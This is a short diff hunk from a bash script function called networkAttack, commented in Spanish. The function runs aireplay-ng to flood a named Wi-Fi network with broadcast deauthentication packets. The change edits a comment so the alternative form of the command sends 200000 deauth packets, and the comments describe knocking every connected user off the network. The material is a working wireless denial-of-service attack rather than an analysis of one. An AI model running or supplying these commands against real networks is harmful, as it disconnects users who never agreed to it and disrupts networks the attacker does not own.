@@ -89,7 +89,7 @@ networkAttack(){
   aireplay-ng -0 0 -e $wifiName -c FF:FF:FF:FF:FF:FF --ignore-negative-one mon0
 
   # Otra forma de usar el mismo comando por parámetros es la siguiente:
-  # aireplay-ng --deauth -e $wifiName --ignore-negative-one mon0, donde se manda
+  # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0, donde se manda
   # un broadcast que emite tráfico hacia todos los usuarios que estén conectados
   # a la misma red que hayamos pasado como parámetro.
   # ----------------------------------------------------------
